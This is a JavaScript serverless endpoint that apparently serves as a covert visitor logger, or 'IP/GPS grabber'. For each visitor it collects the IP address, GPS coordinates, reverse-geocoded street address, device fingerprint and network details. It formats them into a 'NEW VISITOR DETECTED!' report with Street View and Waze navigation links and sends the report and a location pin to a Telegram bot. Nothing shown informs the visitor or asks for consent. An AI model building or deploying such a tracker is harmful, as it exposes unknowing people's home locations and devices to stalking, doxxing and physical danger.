export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: 'Bot not configured' });
    }

    try {
        // Get real IP from Vercel headers
        const ip = req.headers['x-real-ip'] || 
                   req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                   req.connection.remoteAddress || 
                   'Unknown';

        // Client data from browser
        const clientData = req.body || {};

        // Fetch detailed IP info from multiple sources
        let locationData = {};
        
        // Source 1: ip-api.com (more detailed)
        try {
            const ipApiResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,district`);
            const ipApiData = await ipApiResponse.json();
            locationData = { ...locationData, ...ipApiData };
        } catch (e) {
            console.error('ip-api.com failed:', e);
        }

        // Source 2: ipapi.co (backup, sometimes has street info)
        if (!locationData.city) {
            try {
                const ipapiCoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const ipapiCoData = await ipapiCoResponse.json();
                if (ipapiCoData.city) {
                    locationData = {
                        ...locationData,
                        city: locationData.city || ipapiCoData.city,
                        region: locationData.region || ipapiCoData.region,
                        country: locationData.country || ipapiCoData.country_name,
                        postal: locationData.zip || ipapiCoData.postal,
                        lat: locationData.lat || ipapiCoData.latitude,
                        lon: locationData.lon || ipapiCoData.longitude,
                        isp: locationData.isp || ipapiCoData.org
                    };
                }
            } catch (e) {
                console.error('ipapi.co failed:', e);
            }
        }

        // Source 3: OpenStreetMap Nominatim for street-level details (FREE)
        let streetAddress = {};
        if (locationData.lat && locationData.lon) {
            try {
                const nominatimResponse = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationData.lat}&lon=${locationData.lon}&addressdetails=1&zoom=18`,
                    {
                        headers: {
                            'User-Agent': 'TelegramLogger/1.0'
                        }
                    }
                );
                const nominatimData = await nominatimResponse.json();
                
                if (nominatimData.address) {
                    const addr = nominatimData.address;
                    streetAddress = {
                        road: addr.road || addr.street || addr.pedestrian || '',
                        house_number: addr.house_number || '',
                        building: addr.building || addr.block || '',
                        block: addr.block || addr.building || '',
                        lot: addr.lot || '',
                        suburb: addr.suburb || addr.neighbourhood || '',
                        neighbourhood: addr.neighbourhood || addr.suburb || '',
                        district: addr.district || addr.county || '',
                        borough: addr.borough || '',
                        city: addr.city || addr.town || addr.village || addr.municipality || '',
                        town: addr.town || addr.village || addr.city || '',
                        state: addr.state || addr.region || addr.province || '',
                        state_district: addr.state_district || '',
                        postcode: addr.postcode || '',
                        country: addr.country || '',
                        country_code: addr.country_code || '',
                        display_name: nominatimData.display_name || '',
                        category: nominatimData.category || '',
                        type: nominatimData.type || '',
                        importance: nominatimData.importance || ''
                    };
                }
            } catch (e) {
                console.error('Nominatim failed:', e);
            }
        }

        // Device detection
        const ua = clientData.userAgent || req.headers['user-agent'] || '';
        
        // Detailed device type detection
        let deviceType = 'Desktop';
        let deviceBrand = '';
        let deviceModel = '';
        
        if (/iPhone/i.test(ua)) {
            deviceType = 'Mobile';
            deviceBrand = 'Apple';
            deviceModel = 'iPhone';
            // Try to detect iPhone model
            const iPhoneMatch = ua.match(/iPhone(\d+,\d+)/);
            if (iPhoneMatch) deviceModel = `iPhone ${iPhoneMatch[1]}`;
        } else if (/iPad/i.test(ua)) {
            deviceType = 'Tablet';
            deviceBrand = 'Apple';
            deviceModel = 'iPad';
        } else if (/iPod/i.test(ua)) {
            deviceType = 'Mobile';
            deviceBrand = 'Apple';
            deviceModel = 'iPod';
        } else if (/Android/i.test(ua)) {
            deviceType = /Tablet|Tab/i.test(ua) ? 'Tablet' : 'Mobile';
            const androidMatch = ua.match(/Android\s[\d.]+;\s([^;)]+)/);
            if (androidMatch) {
                deviceModel = androidMatch[1].trim();
                if (/Samsung|SM-/i.test(deviceModel)) deviceBrand = 'Samsung';
                else if (/Pixel/i.test(deviceModel)) deviceBrand = 'Google';
                else if (/OnePlus/i.test(deviceModel)) deviceBrand = 'OnePlus';
                else if (/Xiaomi|Redmi|POCO|Mi /i.test(deviceModel)) deviceBrand = 'Xiaomi';
                else if (/Huawei|HONOR/i.test(deviceModel)) deviceBrand = 'Huawei';
                else if (/OPPO|CPH/i.test(deviceModel)) deviceBrand = 'OPPO';
                else if (/vivo|V\d+/i.test(deviceModel)) deviceBrand = 'Vivo';
                else if (/realme/i.test(deviceModel)) deviceBrand = 'Realme';
                else if (/Motorola|moto/i.test(deviceModel)) deviceBrand = 'Motorola';
                else if (/Nokia/i.test(deviceModel)) deviceBrand = 'Nokia';
                else if (/LG|LM-/i.test(deviceModel)) deviceBrand = 'LG';
                else if (/Sony/i.test(deviceModel)) deviceBrand = 'Sony';
                else deviceBrand = 'Android';
            }
        } else if (/Windows/i.test(ua)) {
            deviceBrand = 'Microsoft';
            if (/Touch/i.test(ua)) deviceType = 'Tablet';
        } else if (/Macintosh|Mac OS X/i.test(ua)) {
            deviceBrand = 'Apple';
            deviceModel = 'Mac';
        } else if (/Linux/i.test(ua)) {
            deviceBrand = 'Linux';
        }

        // Browser detection
        let browser = 'Unknown';
        let browserVersion = '';
        
        if (/Edg\/([\d.]+)/i.test(ua)) {
            browser = 'Microsoft Edge';
            browserVersion = ua.match(/Edg\/([\d.]+)/i)[1];
        } else if (/OPR\/([\d.]+)/i.test(ua)) {
            browser = 'Opera';
            browserVersion = ua.match(/OPR\/([\d.]+)/i)[1];
        } else if (/Chrome\/([\d.]+)/i.test(ua) && !/Edg/i.test(ua)) {
            browser = 'Google Chrome';
            browserVersion = ua.match(/Chrome\/([\d.]+)/i)[1];
        } else if (/Firefox\/([\d.]+)/i.test(ua)) {
            browser = 'Mozilla Firefox';
            browserVersion = ua.match(/Firefox\/([\d.]+)/i)[1];
        } else if (/Safari\/([\d.]+)/i.test(ua) && !/Chrome/i.test(ua)) {
            browser = 'Apple Safari';
            browserVersion = ua.match(/Version\/([\d.]+)/i)?.[1] || ua.match(/Safari\/([\d.]+)/i)[1];
        } else if (/MSIE ([\d.]+)/i.test(ua) || /Trident\/.*rv:([\d.]+)/i.test(ua)) {
            browser = 'Internet Explorer';
            browserVersion = ua.match(/MSIE ([\d.]+)/i)?.[1] || ua.match(/rv:([\d.]+)/i)[1];
        } else if (/Brave/i.test(ua)) {
            browser = 'Brave';
            browserVersion = ua.match(/Chrome\/([\d.]+)/i)?.[1] || '';
        } else if (/Vivaldi\/([\d.]+)/i.test(ua)) {
            browser = 'Vivaldi';
            browserVersion = ua.match(/Vivaldi\/([\d.]+)/i)[1];
        } else if (/SamsungBrowser\/([\d.]+)/i.test(ua)) {
            browser = 'Samsung Internet';
            browserVersion = ua.match(/SamsungBrowser\/([\d.]+)/i)[1];
        }

        // OS detection with version
        let os = 'Unknown';
        if (/Windows NT 11.0/i.test(ua)) os = 'Windows 11';
        else if (/Windows NT 10.0/i.test(ua)) os = 'Windows 10';
        else if (/Windows NT 6.3/i.test(ua)) os = 'Windows 8.1';
        else if (/Windows NT 6.2/i.test(ua)) os = 'Windows 8';
        else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
        else if (/Windows NT 6.0/i.test(ua)) os = 'Windows Vista';
        else if (/Windows NT 5.1/i.test(ua)) os = 'Windows XP';
        else if (/Mac OS X 15/i.test(ua)) os = 'macOS Sequoia';
        else if (/Mac OS X 14/i.test(ua)) os = 'macOS Sonoma';
        else if (/Mac OS X 13/i.test(ua)) os = 'macOS Ventura';
        else if (/Mac OS X 12/i.test(ua)) os = 'macOS Monterey';
        else if (/Mac OS X 11/i.test(ua)) os = 'macOS Big Sur';
        else if (/Mac OS X 10[._]15/i.test(ua)) os = 'macOS Catalina';
        else if (/Mac OS X 10[._]14/i.test(ua)) os = 'macOS Mojave';
        else if (/Mac OS X/i.test(ua)) os = 'macOS';
        else if (/Linux/i.test(ua) && !/Android/i.test(ua)) {
            os = 'Linux';
            if (/Ubuntu/i.test(ua)) os = 'Ubuntu Linux';
            else if (/Fedora/i.test(ua)) os = 'Fedora Linux';
            else if (/Debian/i.test(ua)) os = 'Debian Linux';
        }
        else if (/Android (\d+)/i.test(ua)) {
            const version = ua.match(/Android (\d+)/i)[1];
            os = `Android ${version}`;
        }
        else if (/iPhone OS (\d+_\d+)/i.test(ua)) {
            const version = ua.match(/iPhone OS (\d+_\d+)/i)[1].replace(/_/g, '.');
            os = `iOS ${version}`;
        }
        else if (/CrOS/i.test(ua)) os = 'Chrome OS';

        // Create maps links (FREE - no API needed)
        let googleMapsLink = '';
        let googleMapsStreetView = '';
        let appleMapsLink = '';
        let wazeLink = '';
        let openStreetMapLink = '';
        
        if (locationData.lat && locationData.lon) {
            const lat = locationData.lat;
            const lon = locationData.lon;
            
            googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            googleMapsStreetView = `https://www.google.com/maps/@${lat},${lon},21z`;
            appleMapsLink = `https://maps.apple.com/?ll=${lat},${lon}&q=Location`;
            wazeLink = `https://www.waze.com/ul?ll=${lat},${lon}&navigate=yes`;
            openStreetMapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=18`;
        }
        
        // Use GPS coordinates if available (more accurate)
        if (clientData.gpsLat && clientData.gpsLon) {
            const gpsLat = clientData.gpsLat;
            const gpsLon = clientData.gpsLon;
            
            googleMapsLink = `https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
            googleMapsStreetView = `https://www.google.com/maps/@${gpsLat},${gpsLon},21z`;
            appleMapsLink = `https://maps.apple.com/?ll=${gpsLat},${gpsLon}&q=Precise+Location`;
            wazeLink = `https://www.waze.com/ul?ll=${gpsLat},${gpsLon}&navigate=yes`;
            openStreetMapLink = `https://www.openstreetmap.org/?mlat=${gpsLat}&mlon=${gpsLon}&zoom=18`;
        }

        // Build detailed address string
        let fullAddress = [];
        
        if (streetAddress.house_number && streetAddress.road) {
            fullAddress.push(`🏠 House Number: ${streetAddress.house_number}, ${streetAddress.road}`);
        } else if (streetAddress.road) {
            fullAddress.push(`🛣️ Street/Road: ${streetAddress.road}`);
        }
        
        if (streetAddress.building) {
            fullAddress.push(`🏢 Building: ${streetAddress.building}`);
        }
        
        if (streetAddress.block) {
            fullAddress.push(`📦 Block: ${streetAddress.block}`);
        }
        
        if (streetAddress.lot) {
            fullAddress.push(`🗂️ Lot: ${streetAddress.lot}`);
        }
        
        if (streetAddress.suburb || streetAddress.neighbourhood) {
            fullAddress.push(`🏘️ Suburb/Neighborhood: ${streetAddress.suburb || streetAddress.neighbourhood}`);
        }
        
        if (streetAddress.borough) {
            fullAddress.push(`🏛️ Borough: ${streetAddress.borough}`);
        }
        
        if (streetAddress.district) {
            fullAddress.push(`📌 District/County: ${streetAddress.district}`);
        }
        
        if (streetAddress.state_district) {
            fullAddress.push(`🗺️ State District: ${streetAddress.state_district}`);
        }
        
        if (streetAddress.state) {
            fullAddress.push(`🏴 State/Province: ${streetAddress.state}`);
        }
        
        if (streetAddress.postcode) {
            fullAddress.push(`📮 Postal Code: ${streetAddress.postcode}`);
        }

        // Build Telegram message
        const message = [
            '🕵️ <b>🔴 NEW VISITOR DETECTED!</b>',
            '',
            '━━━━━━━━━━━━━━━━━━━━',
            '📅 <b>DATE & TIME</b>',
            '━━━━━━━━━━━━━━━━━━━━',
            `${new Date().toLocaleString('en-US', { 
                timeZone: locationData.timezone || 'UTC',
                weekday: 'long',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                timeZoneName: 'short'
            })}`,
            '',
            '━━━━━━━━━━━━━━━━━━━━',
            '🌐 <b>IP ADDRESS</b>',
            '━━━━━━━━━━━━━━━━━━━━',
            `<code>${ip}</code>`,
            '',
            '━━━━━━━━━━━━━━━━━━━━',
            '📍 <b>LOCATION DETAILS</b>',
            '━━━━━━━━━━━━━━━━━━━━',
            `🌍 Country: ${locationData.country || streetAddress.country || 'Unknown'} (${locationData.countryCode || streetAddress.country_code || '?'})`,
            `🏛️ Region/State: ${locationData.regionName || streetAddress.state || 'Unknown'}`,
            `🏙️ City: ${locationData.city || streetAddress.city || 'Unknown'}`,
            `📮 ZIP/Postal: ${locationData.zip || streetAddress.postcode || 'Unknown'}`,
        ];

        // Add street-level details if available
        if (fullAddress.length > 0) {
            message.push('');
            message.push('<b>📋 STREET ADDRESS:</b>');
            message.push(...fullAddress);
        }

        // Add OSM category if available
        if (streetAddress.category || streetAddress.type) {
            message.push('');
            message.push(`🏷️ Location Type: ${streetAddress.type || 'Unknown'} (${streetAddress.category || 'General'})`);
        }

        // Add maps links
        message.push(
            '',
            '━━━━━━━━━━━━━━━━━━━━',
            '🗺️ <b>MAPS & NAVIGATION</b>',
            '━━━━━━━━━━━━━━━━━━━━',
            `<a href="${googleMapsLink}">📍 Google Maps</a>`,
            `<a href="${googleMapsStreetView}">🚶 Google Street View</a>`,
            `<a href="${appleMapsLink}">🗾 Apple Maps</a>`,
            `<a href="${wazeLink}">🚗 Waze Navigation</a>`,
            `<a href="${openStreetMapLink}">🌍 OpenStreetMap</a>`,
            '',
            `🎯 Coordinates: <code>${locationData.lat || clientData.gpsLat}, ${locationData.lon || clientData.gpsLon}</code>`
        );

        // GPS info if available
        if (clientData.gpsLat && clientData.gpsLon) {
            message.push(
                '',
                '🛰️ <b>GPS DATA (Device)</b>',
                `🎯 Accuracy: ${clientData.gpsAccuracy ? Math.round(clientData.gpsAccuracy) + 'm' : 'Unknown'}`,
                `📏 Altitude: ${clientData.gpsAltitude ? Math.round(clientData.gpsAltitude) + 'm' : 'N/A'}`,
                `🏃 Speed: ${clientData.gpsSpeed ? Math.round(clientData.gpsSpeed) + ' m/s' : 'Stationary'}`,
                `🧭 Heading: ${clientData.gpsHeading ? Math.round(clientData.gpsHeading) + '°' : 'N/A'}`
            );
        } else if (clientData.gpsError) {
            message.push('', `⚠️ GPS: ${clientData.gpsError}`);
        }

        message.push(
            '',
            '━━━━━━━━━━━━━━━━━━━━',
            '📱 <b>DEVICE INFO</b>',
            '━━━━━━━━━━━━━━━━━━━━'
        );

        if (deviceBrand) {
            message.push(`🏭 Brand: ${deviceBrand}`);
        }
        if (deviceModel) {
            message.push(`📲 Model: ${deviceModel}`);
        }
        
        message.push(
            `💻 Type: ${deviceType}`,
            `🖥️ OS: ${os}`,
            `🌐 Browser: ${browser}${browserVersion ? ' ' + browserVersion : ''}`,
            `📺 Screen: ${clientData.screen || 'Unknown'} (Avail: ${clientData.availScreen || 'N/A'})`,
            `🖼️ Color Depth: ${clientData.colorDepth || 'Unknown'}-bit`,
            `📐 Pixel Ratio: ${clientData.pixelRatio || '1x'}`,
            `👆 Touch Screen: ${clientData.touchScreen ? '✅ Yes' : '❌ No'}`,
            '',
            '━━━━━━━━━━━━━━━━━━━━',
            '🔧 <b>TECHNICAL INFO</b>',
            '━━━━━━━━━━━━━━━━━━━━',
            `🏢 ISP: ${locationData.isp || 'Unknown'}`,
            `🏭 Organization: ${locationData.org || 'Unknown'}`,
            `🔢 AS Number: ${locationData.as || 'Unknown'}`,
            `🌍 Language: ${clientData.language || 'Unknown'}`,
            `🗣️ All Languages: ${clientData.languages || 'N/A'}`,
            `⏰ Timezone: ${clientData.timezone || locationData.timezone || 'Unknown'}`,
            `🔗 Referrer: ${clientData.referrer || 'Direct'}`,
            `🍪 Cookies: ${clientData.cookiesEnabled ? '✅ Enabled' : '❌ Disabled'}`,
            `🔒 DNT: ${clientData.doNotTrack || 'Not set'}`,
            `📄 URL: ${clientData.url || 'Unknown'}`,
            `💻 Platform: ${clientData.platform || 'Unknown'}`,
            `🧠 Device Memory: ${clientData.memory || 'Unknown'} GB`,
            `⚡ CPU Cores: ${clientData.cpuCores || 'Unknown'}`,
            `📶 Online: ${clientData.online ? '✅ Yes' : '❌ No'}`
        );

        // Connection info if available
        if (clientData.connection && clientData.connection.type) {
            message.push(
                `📡 Connection: ${clientData.connection.type.toUpperCase()}`,
                `📶 Speed: ${clientData.connection.downlink || '?'} Mbps`,
                `⏱️ Latency: ${clientData.connection.rtt || '?'}ms`
            );
        }

        // Send main message to Telegram
        const textResponse = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message.join('\n'),
                    parse_mode: 'HTML',
                    disable_web_page_preview: false
                })
            }
        );

        // Send location pin
        const sendLat = clientData.gpsLat || locationData.lat;
        const sendLon = clientData.gpsLon || locationData.lon;
        
        if (sendLat && sendLon) {
            await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: sendLat,
                        longitude: sendLon
                    })
                }
            );
        }

        return res.status(200).json({ success: true });

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
}
